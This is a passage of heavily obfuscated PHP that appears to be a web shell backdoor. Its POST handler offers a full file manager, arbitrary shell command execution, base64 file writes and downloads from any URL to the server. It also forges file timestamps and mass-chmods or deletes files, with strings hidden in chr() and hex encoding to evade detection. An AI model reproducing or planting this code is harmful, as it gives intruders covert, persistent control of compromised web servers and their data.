    $_21ee2a = chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109);
    if (is_fn_usable(chr(102).chr(105).chr(110).chr(102).chr(111).chr(95).chr(111).chr(112).chr(101).chr(110))) {
        $_48c5f8 = @finfo_open(FILEINFO_MIME_TYPE);
        if ($_48c5f8) {
            $_2b0df5 = @finfo_file($_48c5f8, $_bc8cc3);
            if ($_2b0df5)
                $_21ee2a = $_2b0df5;
            @finfo_close($_48c5f8);
        }
    }
    elseif (is_fn_usable("\x6d\x69\x6d\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x5f\x74\x79\x70\x65")) {
        $_164ce0 = @mime_content_type($_bc8cc3);
        if ($_164ce0)
            $_21ee2a = $_164ce0;
    }
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20" . $_21ee2a);
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($_bc8cc3));
    header(chr(88).chr(45).chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(110).chr(111).chr(115).chr(110).chr(105).chr(102).chr(102));
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(105).chr(110).chr(108).chr(105).chr(110).chr(101).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($_bc8cc3) . chr(34));
    readfile($_bc8cc3);
    exit;
}


if ($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"] === chr(80).chr(79).chr(83).chr(84)) {
    _f66d060dd();
    if (!function_exists(chr(98).chr(105).chr(114).chr(117).chr(95).chr(114).chr(101).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116))) {
        function biru_redirect($_7c37a1)
        {
            header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_7c37a1));
            exit;
        }
    }
    switch ($_34a35d) {
        case chr(108).chr(111).chr(103).chr(111).chr(117).chr(116): {
                session_destroy();
                header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63));
                exit;
            }
        case chr(110).chr(101).chr(119).chr(45).chr(102).chr(105).chr(108).chr(101): {
                $_aa96df = trim((string)(isset($_POST[chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(110).chr(97).chr(109).chr(101)] : ''));
                $_9aa650 = isset($_POST["\x63\x6f\x6e\x74\x65\x6e\x74"]) ? (string)$_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] : null;
                if ($_aa96df === "" || strpos($_aa96df, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x65\x77\x20\x46\x69\x6c\x65\x3a\x20\x69\x6e\x76\x61\x6c\x69\x64\x20\x6e\x61\x6d\x65";
                    biru_redirect($_cf79f1);
                }
                $_64de82 = _f46d3561b($_cf79f1, $_aa96df);
                if (file_exists($_64de82)) {
                    $_SESSION["\x6d\x73\x67"] = "\x4e\x65\x77\x20\x46\x69\x6c\x65\x3a\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65\x78\x69\x73\x74\x73";
                    biru_redirect($_cf79f1);
                }
                list($_9ece03, $_8185ca) = _f54d03cd0($_64de82, $_9aa650);
                $_SESSION["\x6d\x73\x67"] = $_9ece03 ? ("New File OK via {$_8185ca}: " . $_aa96df) : (chr(78).chr(101).chr(119).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_8185ca);
                biru_redirect($_cf79f1);
            }
        case "\x6e\x65\x77\x2d\x64\x69\x72": {
                $_aa96df = trim((string)(isset($_POST[chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x6e\x61\x6d\x65"] : ""));
                if ($_aa96df === "" || strpos($_aa96df, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION["\x6d\x73\x67"] = "\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x3a\x20\x69\x6e\x76\x61\x6c\x69\x64\x20\x6e\x61\x6d\x65";
                    biru_redirect($_cf79f1);
                }
                $_64de82 = _f46d3561b($_cf79f1, $_aa96df);
                if (file_exists($_64de82)) {
                    $_SESSION["\x6d\x73\x67"] = chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(58).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115);
                    biru_redirect($_cf79f1);
                }
                $_9ece03 = @mkdir($_64de82, 0775, false);
                $_SESSION["\x6d\x73\x67"] = $_9ece03 ? ("\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x20\x4f\x4b\x3a\x20" . $_aa96df) : chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                biru_redirect($_cf79f1);
            }
        case chr(101).chr(100).chr(105).chr(116).chr(45).chr(115).chr(97).chr(118).chr(101): {
                $_5e5052 = _f46d3561b($_cf79f1, isset($_POST[chr(102).chr(105).chr(108).chr(101)]) ? $_POST["\x66\x69\x6c\x65"] : '');
                $_9aa650 = isset($_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]) ? $_POST["\x63\x6f\x6e\x74\x65\x6e\x74"] : '';
                $_d92393 = isset($_POST["\x6d\x6f\x64\x65"]) ? $_POST[chr(109).chr(111).chr(100).chr(101)] : "\x74\x78\x74";
                if (!is_file($_5e5052) || !is_writable($_5e5052)) {
                    $_SESSION["\x6d\x73\x67"] = chr(83).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(40).chr(102).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(41);
                    biru_redirect($_cf79f1);
                }
                if ($_d92393 === chr(98).chr(54).chr(52)) {
                    $_fa026a = base64_decode($_9aa650, true);
                    if ($_fa026a === false) {
                        $_SESSION[chr(109).chr(115).chr(103)] = "\x53\x61\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x69\x6e\x76\x61\x6c\x69\x64\x20\x42\x61\x73\x65\x36\x34\x20\x64\x61\x74\x61";
                        biru_redirect($_cf79f1);
                    }
                    @file_put_contents($_5e5052, $_fa026a);
                }
                else {
                    @file_put_contents($_5e5052, $_9aa650);
                }
                $_SESSION["\x6d\x73\x67"] = chr(83).chr(97).chr(118).chr(101).chr(100).chr(58).chr(32) . basename($_5e5052);
                biru_redirect($_cf79f1);
            }
        case chr(114).chr(101).chr(110).chr(97).chr(109).chr(101): {
                $_222cd0 = _f46d3561b($_cf79f1, isset($_POST["\x6f\x6c\x64"]) ? $_POST[chr(111).chr(108).chr(100)] : "");
                $_5de3ac = trim((string)(isset($_POST["\x6e\x65\x77"]) ? $_POST[chr(110).chr(101).chr(119)] : ""));
                if ($_5de3ac === '' || strpos($_5de3ac, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION["\x6d\x73\x67"] = chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(110).chr(101).chr(119).chr(32).chr(110).chr(97).chr(109).chr(101);
                }
                else {
                    $_64de82 = _f46d3561b($_cf79f1, $_5de3ac);
                    $_SESSION["\x6d\x73\x67"] = @rename($_222cd0, $_64de82) ? chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(79).chr(75) : "\x52\x65\x6e\x61\x6d\x65\x20\x66\x61\x69\x6c\x65\x64";
                }
                biru_redirect($_cf79f1);
            }
        case "\x63\x68\x6d\x6f\x64": {
                $_abf3a0 = _f46d3561b($_cf79f1, isset($_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)]) ? $_POST["\x74\x61\x72\x67\x65\x74"] : '');
                $_d92393 = _f0d5cf37f((string)(isset($_POST["\x6d\x6f\x64\x65"]) ? $_POST["\x6d\x6f\x64\x65"] : "\x30\x36\x34\x34"));
                $_646514 = !empty($_POST["\x72\x65\x63\x75\x72\x73\x69\x76\x65"]);
                $_9ece03 = true;
                _f3dae0521($_abf3a0, $_d92393, $_646514, $_9ece03);
                $_SESSION["\x6d\x73\x67"] = $_9ece03 ? chr(67).chr(104).chr(109).chr(111).chr(100).chr(32).chr(79).chr(75) : "\x43\x68\x6d\x6f\x64\x20\x70\x61\x72\x74\x69\x61\x6c\x6c\x79\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_cf79f1);
            }
        case "\x64\x65\x6c\x65\x74\x65": {
                $_d172fd = _f46d3561b($_cf79f1, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)] : "");
                $_SESSION[chr(109).chr(115).chr(103)] = _fbb0fa868($_d172fd) ? chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(79).chr(75) : chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                biru_redirect($_cf79f1);
            }
        case "\x6d\x61\x73\x73\x2d\x64\x65\x6c\x65\x74\x65": {
                $_82327c = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST[chr(105).chr(116).chr(101).chr(109).chr(115)] : array();
                $_9ece03 = true;
                if (is_array($_82327c))
                    foreach ($_82327c as $_875c06) {
                        $_9ece03 = _fbb0fa868(_f46d3561b($_cf79f1, $_875c06)) && $_9ece03;
                    }
                $_SESSION[chr(109).chr(115).chr(103)] = $_9ece03 ? chr(66).chr(117).chr(108).chr(107).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(79).chr(75) : chr(83).chr(111).chr(109).chr(101).chr(32).chr(105).chr(116).chr(101).chr(109).chr(115).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101);
                biru_redirect($_cf79f1);
            }
        case "\x6d\x61\x73\x73\x2d\x63\x68\x6d\x6f\x64": {
                $_82327c = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST[chr(105).chr(116).chr(101).chr(109).chr(115)] : array();
                $_d92393 = _f0d5cf37f((string)(isset($_POST["\x6d\x6f\x64\x65"]) ? $_POST[chr(109).chr(111).chr(100).chr(101)] : "\x30\x36\x34\x34"));
                $_646514 = !empty($_POST["\x72\x65\x63\x75\x72\x73\x69\x76\x65"]);
                $_9ece03 = true;
                $_a1520a = 0;
                if (is_array($_82327c))
                    foreach ($_82327c as $_875c06) {
                        _f3dae0521(_f46d3561b($_cf79f1, $_875c06), $_d92393, $_646514, $_9ece03);
                        $_a1520a++;
                    }
                if ($_a1520a === 0)
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x6f\x20\x69\x74\x65\x6d\x73\x20\x73\x65\x6c\x65\x63\x74\x65\x64\x20\x66\x6f\x72\x20\x63\x68\x6d\x6f\x64";
                else
                    $_SESSION[chr(109).chr(115).chr(103)] = $_9ece03 ? "\x42\x75\x6c\x6b\x20\x63\x68\x6d\x6f\x64\x20\x4f\x4b" : chr(83).chr(111).chr(109).chr(101).chr(32).chr(105).chr(116).chr(101).chr(109).chr(115).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(99).chr(104).chr(109).chr(111).chr(100);
                biru_redirect($_cf79f1);
            }
        case chr(117).chr(112).chr(108).chr(111).chr(97).chr(100): {
                if (!isset($_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)])) {
                    $_SESSION["\x6d\x73\x67"] = chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(32).chr(112).chr(114).chr(111).chr(118).chr(105).chr(100).chr(101).chr(100);
                    biru_redirect($_cf79f1);
                }
                $_7c37a1 = count($_FILES["\x66\x69\x6c\x65\x73"][chr(110).chr(97).chr(109).chr(101)]);
                $_9ece03 = 0;
                $_d2cf60 = 0;
                $_b2c540 = array();
                for ($_880dfd = 0; $_880dfd < $_7c37a1; $_880dfd++) {
                    $_aa96df = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)]["\x6e\x61\x6d\x65"][$_880dfd];
                    $_164ce0 = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)]["\x74\x6d\x70\x5f\x6e\x61\x6d\x65"][$_880dfd];
                    $_5be2f1 = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)][chr(101).chr(114).chr(114).chr(111).chr(114)][$_880dfd];
                    if ($_5be2f1 !== UPLOAD_ERR_OK) {
                        $_d2cf60++;
                        $_b2c540[] = "$_aa96df (error $_5be2f1)";
                        continue;
                    }
                    list($_fe0904, $_c9d5a1) = _ffa8e98f4($_164ce0, _f46d3561b($_cf79f1, $_aa96df));
                    if ($_fe0904)
                        $_9ece03++;
                    else {
                        $_d2cf60++;
                        $_b2c540[] = "$_aa96df ($_c9d5a1)";
                    }
                }
                $_SESSION[chr(109).chr(115).chr(103)] = "Upload: OK=$_9ece03; Failed=$_d2cf60" . ($_b2c540 ? "\x3b\x20" . implode("\x2c\x20", $_b2c540) : "");
                biru_redirect($_cf79f1);
            }
        case chr(117).chr(114).chr(108).chr(45).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100): {
                $_4e1d7e = trim((string)(isset($_POST["\x75\x72\x6c"]) ? $_POST["\x75\x72\x6c"] : ''));
                $_fe4e19 = trim((string)(isset($_POST["\x66\x69\x6c\x65\x6e\x61\x6d\x65"]) ? $_POST["\x66\x69\x6c\x65\x6e\x61\x6d\x65"] : ''));
                if ($_4e1d7e === "") {
                    $_SESSION["\x6d\x73\x67"] = "\x55\x52\x4c\x20\x69\x73\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_cf79f1);
                }
                if ($_fe4e19 === '') {
                    $_1db743 = parse_url($_4e1d7e, PHP_URL_PATH);
                    $_fe4e19 = basename($_1db743 ? $_1db743 : "");
                    if ($_fe4e19 === '') {
                        $_fe4e19 = "\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2e\x62\x69\x6e";
                    }
                }
                list($_9ece03, $_29a9ce) = fetchUrlToFile($_4e1d7e, _f46d3561b($_cf79f1, $_fe4e19));
                $_SESSION[chr(109).chr(115).chr(103)] = $_9ece03 ? "Downloaded from URL: $_fe4e19" : "URL download failed: $_29a9ce";
                biru_redirect($_cf79f1);
            }
        case "\x6d\x74\x69\x6d\x65": {
                $_abf3a0 = _f46d3561b($_cf79f1, isset($_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)]) ? $_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)] : "");
                $_65d3b3 = trim((string)(isset($_POST["\x74\x73"]) ? $_POST[chr(116).chr(115)] : ""));
                $_646514 = !empty($_POST[chr(114).chr(101).chr(99).chr(117).chr(114).chr(115).chr(105).chr(118).chr(101)]);
                if ($_65d3b3 === '') {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x3a\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_cf79f1);
                }
                if (ctype_digit($_65d3b3))
                    $_5d7ae8 = (int)$_65d3b3;
                else {
                    $_5d7ae8 = @strtotime($_65d3b3);
                    if ($_5d7ae8 === false) {
                        $_SESSION["\x6d\x73\x67"] = chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(116).chr(105).chr(109).chr(101).chr(32).chr(102).chr(111).chr(114).chr(109).chr(97).chr(116);
                        biru_redirect($_cf79f1);
                    }
                }
                $_9ece03 = true;
                _f448d7910($_abf3a0, $_5d7ae8, $_646514, $_9ece03);
                $_SESSION[chr(109).chr(115).chr(103)] = $_9ece03 ? (chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(32).chr(79).chr(75).chr(32).chr(226).chr(134).chr(146).chr(32) . date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), $_5d7ae8)) : chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(32).chr(112).chr(97).chr(114).chr(116).chr(105).chr(97).chr(108).chr(108).chr(121).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                biru_redirect($_cf79f1);
            }
        case chr(99).chr(109).chr(100): {
                $_526084 = trim((string)(isset($_POST[chr(99).chr(109).chr(100)]) ? $_POST[chr(99).chr(109).chr(100)] : ""));
                if ($_526084 === '') {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(67).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(105).chr(115).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121).chr(46);
                    biru_redirect($_cf79f1);
                }
                $_4c63c8 = run_command_all($_526084, $_cf79f1);
                $_36db60 = (string)$_4c63c8["\x6f\x75\x74"];
                if (strlen($_36db60) > 1024 * 1024)
                    $_36db60 = substr($_36db60, 0, 1024 * 1024) . "\x0a\x5b\x6f\x75\x74\x70\x75\x74\x20\x74\x72\x75\x6e\x63\x61\x74\x65\x64\x5d";
                $_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)] = array(chr(99).chr(109).chr(100) => $_526084, "\x6d\x65\x74\x68\x6f\x64" => $_4c63c8[chr(109).chr(101).chr(116).chr(104).chr(111).chr(100)], "\x63\x6f\x64\x65" => $_4c63c8["\x63\x6f\x64\x65"], "\x6f\x75\x74" => $_36db60);
                biru_redirect($_cf79f1);
            }

        
        case "\x6d\x6f\x76\x65": {
                $_6ea11a = (string)(isset($_POST[chr(115).chr(114).chr(99)]) ? $_POST[chr(115).chr(114).chr(99)] : "");
                $_149b68 = (string)(isset($_POST[chr(100).chr(115).chr(116)]) ? $_POST["\x64\x73\x74"] : '');
                $_a287f5 = _f46d3561b($_cf79f1, $_6ea11a);
                if ($_6ea11a === '' || !file_exists($_a287f5)) {
                    $_SESSION["\x6d\x73\x67"] = "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x73\x6f\x75\x72\x63\x65\x20\x6d\x69\x73\x73\x69\x6e\x67";
                    biru_redirect($_cf79f1);
                }
                if ($_149b68 === "") {
                    $_SESSION["\x6d\x73\x67"] = chr(77).chr(111).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(100).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121);
                    biru_redirect($_cf79f1);
                }
                if (!is_dir($_149b68)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(77).chr(111).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(100).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(115).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121);
                    biru_redirect($_cf79f1);
                }
                $_65488d = _f46d3561b($_149b68, basename($_6ea11a));
                if (@realpath($_a287f5) === @realpath($_65488d)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(77).chr(111).chr(118).chr(101).chr(32).chr(115).chr(107).chr(105).chr(112).chr(112).chr(101).chr(100).chr(32).chr(40).chr(115).chr(97).chr(109).chr(101).chr(32).chr(108).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(41);
                    biru_redirect($_cf79f1);
                }
                $_9ece03 = @rename($_a287f5, $_65488d);
                $_SESSION["\x6d\x73\x67"] = $_9ece03 ? "\x4d\x6f\x76\x65\x20\x4f\x4b" : "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_cf79f1);
            }
        case "\x7a\x69\x70": {
                $_baeb7e = isset($_POST["\x69\x74\x65\x6d\x73"]) ? $_POST[chr(105).chr(116).chr(101).chr(109).chr(115)] : array();
                $_aa96df = trim((string)(isset($_POST["\x7a\x69\x70\x6e\x61\x6d\x65"]) ? $_POST["\x7a\x69\x70\x6e\x61\x6d\x65"] : ''));
                if (!is_array($_baeb7e) || empty($_baeb7e)) {
                    $_SESSION["\x6d\x73\x67"] = "\x5a\x69\x70\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x6e\x6f\x74\x68\x69\x6e\x67\x20\x73\x65\x6c\x65\x63\x74\x65\x64";
                    biru_redirect($_cf79f1);
                }
                if ($_aa96df === '')
                    $_aa96df = chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(45) . date(chr(89).chr(109).chr(100).chr(45).chr(72).chr(105).chr(115)) . "\x2e\x7a\x69\x70";
                $_c8c495 = _f46d3561b($_cf79f1, $_aa96df);

                $_fe0904 = false;
                $_3ebd7d = '';
                if (class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101))) {
                    $_8bec1a = new ZipArchive();
                    if ($_8bec1a->open($_c8c495, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        foreach ($_baeb7e as $_6c86ea) {
                            $_e10a9b = _f46d3561b($_cf79f1, $_6c86ea);
                            if (is_dir($_e10a9b)) {
                                $_128426 = rtrim($_6c86ea, DIRECTORY_SEPARATOR);
                                _f01a4de89($_8bec1a, $_e10a9b, $_128426);
                            }
                            elseif (is_file($_e10a9b)) {
                                $_8bec1a->addFile($_e10a9b, basename($_6c86ea));
                            }
                        }
                        $_8bec1a->close();
                        $_fe0904 = true;
                    }
                    else {
                        $_3ebd7d = chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                }
                if (!$_fe0904) {
                    if (class_exists("\x50\x68\x61\x72\x44\x61\x74\x61")) {
                        try {
                            $_4ddca0 = preg_replace("\x7e\x5c\x2e\x7a\x69\x70\x24\x7e\x69", "\x2e\x74\x61\x72", $_c8c495);
                            $_055d20 = new PharData($_4ddca0);
                            foreach ($_baeb7e as $_6c86ea) {
                                $_e10a9b = _f46d3561b($_cf79f1, $_6c86ea);
                                if (is_dir($_e10a9b)) {
                                    $_055d20->addEmptyDir(basename($_6c86ea));
                                    _fae6f7bbc($_055d20, $_e10a9b, basename($_6c86ea));
                                }
                                elseif (is_file($_e10a9b)) {
                                    $_055d20->addFile($_e10a9b, basename($_6c86ea));
                                }
                            }
                            unset($_055d20);
                            $_SESSION[chr(109).chr(115).chr(103)] = chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101).chr(59).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(32).chr(84).chr(65).chr(82).chr(32).chr(105).chr(110).chr(115).chr(116).chr(101).chr(97).chr(100).chr(58).chr(32) . basename($_4ddca0);
                            biru_redirect($_cf79f1);
                        }
                        catch (Exception $_5be2f1) {
                            $_3ebd7d = chr(84).chr(65).chr(82).chr(32).chr(102).chr(97).chr(108).chr(108).chr(98).chr(97).chr(99).chr(107).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_5be2f1->getMessage();
                        }
                    }
                    else {
                        $_3ebd7d = ($_3ebd7d ? $_3ebd7d . "\x3b\x20" : "") . "\x4e\x6f\x20\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65\x20\x6e\x6f\x72\x20\x50\x68\x61\x72\x44\x61\x74\x61\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
                    }
                }
                $_SESSION[chr(109).chr(115).chr(103)] = $_fe0904 ? (chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(58).chr(32) . basename($_c8c495)) : (chr(90).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_3ebd7d);
                biru_redirect($_cf79f1);
            }
        case chr(117).chr(110).chr(122).chr(105).chr(112): {
                $_5e5052 = _f46d3561b($_cf79f1, isset($_POST[chr(102).chr(105).chr(108).chr(101)]) ? $_POST[chr(102).chr(105).chr(108).chr(101)] : "");
                if (!is_file($_5e5052)) {
                    $_SESSION["\x6d\x73\x67"] = "\x55\x6e\x7a\x69\x70\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x66\x69\x6c\x65\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64";
                    biru_redirect($_cf79f1);
                }
                $_d627b9 = strtolower(pathinfo($_5e5052, PATHINFO_EXTENSION));
                $_9ece03 = false;
                $_3ebd7d = "";
                if ($_d627b9 === "\x7a\x69\x70" && class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101))) {
                    $_8bec1a = new ZipArchive();
                    if ($_8bec1a->open($_5e5052) === true) {
                        $_9ece03 = $_8bec1a->extractTo($_cf79f1);
                        $_8bec1a->close();
                        if (!$_9ece03)
                            $_3ebd7d = chr(90).chr(105).chr(112).chr(32).chr(101).chr(120).chr(116).chr(114).chr(97).chr(99).chr(116).chr(84).chr(111).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                    else {
                        $_3ebd7d = chr(90).chr(105).chr(112).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                }
                else {
                    try {
                        if (class_exists(chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97)) && preg_match("\x7e\x5c\x2e\x28\x74\x61\x72\x7c\x74\x61\x72\x5c\x2e\x67\x7a\x7c\x74\x61\x72\x5c\x2e\x62\x7a\x32\x7c\x74\x61\x72\x5c\x2e\x78\x7a\x29\x24\x7e\x69", $_5e5052)) {
                            $_055d20 = new PharData($_5e5052);
                            $_055d20->extractTo($_cf79f1, null, true);
                            $_9ece03 = true;
                        }
                        else {
                            $_3ebd7d = chr(85).chr(110).chr(115).chr(117).chr(112).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100).chr(32).chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(116).chr(121).chr(112).chr(101).chr(32).chr(111).chr(114).chr(32).chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
                        }
                    }
                    catch (Exception $_5be2f1) {
                        $_3ebd7d = $_5be2f1->getMessage();
                    }
                }
                $_SESSION[chr(109).chr(115).chr(103)] = $_9ece03 ? chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(79).chr(75) : ("\x55\x6e\x7a\x69\x70\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_3ebd7d);
                biru_redirect($_cf79f1);
            }
    }
}



function _f01a4de89($_8bec1a, $_e6f0b6, $_6f644e)
{
    $_e6f0b6 = rtrim($_e6f0b6, DIRECTORY_SEPARATOR);
    if (method_exists($_8bec1a, chr(97).chr(100).chr(100).chr(69).chr(109).chr(112).chr(116).chr(121).chr(68).chr(105).chr(114)))
        $_8bec1a->addEmptyDir($_6f644e);
    $_66f6b0 = @opendir($_e6f0b6);
    if (!$_66f6b0)
        return;
    while (false !== ($_5be2f1 = readdir($_66f6b0))) {
        if ($_5be2f1 === chr(46) || $_5be2f1 === chr(46).chr(46))
            continue;
        $_e10a9b = $_e6f0b6 . DIRECTORY_SEPARATOR . $_5be2f1;
        $_bcc9b1 = $_6f644e . "\x2f" . basename($_5be2f1);
        if (is_dir($_e10a9b))
            _f01a4de89($_8bec1a, $_e10a9b, $_bcc9b1);
        elseif (is_file($_e10a9b) && method_exists($_8bec1a, "\x61\x64\x64\x46\x69\x6c\x65"))
            $_8bec1a->addFile($_e10a9b, $_bcc9b1);
    }
    closedir($_66f6b0);
}
function _fae6f7bbc($_055d20, $_e6f0b6, $_6f644e)
{
    $_e6f0b6 = rtrim($_e6f0b6, DIRECTORY_SEPARATOR);
    $_66f6b0 = @opendir($_e6f0b6);
